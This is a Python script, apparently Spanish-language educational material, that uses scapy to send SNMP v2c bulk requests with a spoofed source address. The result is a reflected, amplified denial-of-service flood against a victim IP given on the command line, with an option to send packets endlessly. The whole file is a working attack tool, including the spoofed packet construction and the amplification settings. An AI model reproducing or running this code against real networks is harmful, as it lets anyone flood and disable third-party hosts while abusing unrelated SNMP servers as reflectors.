# Autor: Juan Esteban Valencia Pantoja jevalenciap@gmail.com 
import sys
import random
import logging # La siguiente  linea es usada para omitir los errores de IPV6 que pueden aparecer por importar scapy.
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
import argparse
import os
import urllib2
if os.getuid() != 0: # Valida si el script esta siendo corrido como root
    print("Debes ejecutar este script como root.")
    sys.exit(1)
parser = argparse.ArgumentParser(description='Esta herramienta contruida con fines educacionales permite simular el comportamiento de  un ataque de denegacion de servicio distribuida basado en reflexion utilizando el protocolo SNMP V2c (DDoS SNMP reflected attack). ') # Esta y las siguientes 4 lineas controlan y definen los argumentos ingresados
parser.add_argument('-d', action="store",dest='snmp_server', help='La IP destino del servidor SNMP(argumento mandatorio)')
parser.add_argument('-c', action="store",dest='community', help='La comunidad SNMP(por defecto es public).')
parser.add_argument('-p', action="store",dest='port', help='El puerto destino del servidor SNMP(por defecto es UDP 161).')
parser.add_argument('-v', action="store",dest='victim_IP', help='La IP de la victima que recibira el ataque(argumento mandatorio).')
parser.add_argument('-s', action="store",dest='count', help='La cantidad de paquetes que deseas enviar,puedes enviar infinitos paquetes ingresando  X o x (argumento mandatorio).')
args = parser.parse_args()


if len(sys.argv) == 1: # Obliga a mostrar el texto del 'help' sino hay argumentos ingresados.
    parser.print_help()
    sys.exit(1)
args = vars(args) # Convierte los argumentos en formato diccionario para facil manejo.
iterationCount = 0 # Variable usada en el ciclo while para controlar la cantidad de veces que un paquete es enviado.

oid ="1.3.6.1.2.1.1.1" # El OID conocido como sysDescr fue el que mejores resultados obtuvo en las pruebas de laboratorio.


if args['port' ] == None :
    uport= 161 # Si no se ingresa el puerto, por defecto sera 161/UDP 
else:
    uport= int(args['port']) # La variable uport toma el valor del puerto 

if args['community']  == None : 
    communi= "public" # Si no se ingresa la comunidad , por defecto sera public
else:
    communi= args['community']

if args['count'] == "X" or args['count'] == "x": # Si se ingresa x o X se enviara infinitos paquetes
      while (1 == 1):
        w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)), SNMPvarbind(oid=ASN1_OID(oid))]))# Esta linea construye el paquete SNMP utilizando los argumentos ingresados
        send(w,  verbose=0) # Envia el paquete
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Paquete enviado")# Mensaje en pantalla
else: # Se ejecuta si el usuario digita la cantidad de paquetes que va enviar
    while iterationCount < int(args['count']):
        w =IP(dst=args['snmp_server'],src=args['victim_IP'])/UDP(sport=RandShort(),dport=uport)/SNMP(version="v2c",community=communi,PDU=SNMPbulk(id=RandNum(1,200000000),max_repetitions=100,varbindlist=[SNMPvarbind(oid=ASN1_OID(oid)),SNMPvarbind(oid=ASN1_OID(oid) )]))# Se envia paquete SNMP  utilizando los argumentos ingresados
        send(w,  verbose=0) # Envia el paquete
        iterationCount = iterationCount + 1
        print(str(iterationCount) + " Paquete enviado")
print("Todos los paquetes fueron enviados exitosamente.")# Mensaje mostrado cuando todos los paquetes han sido enviados

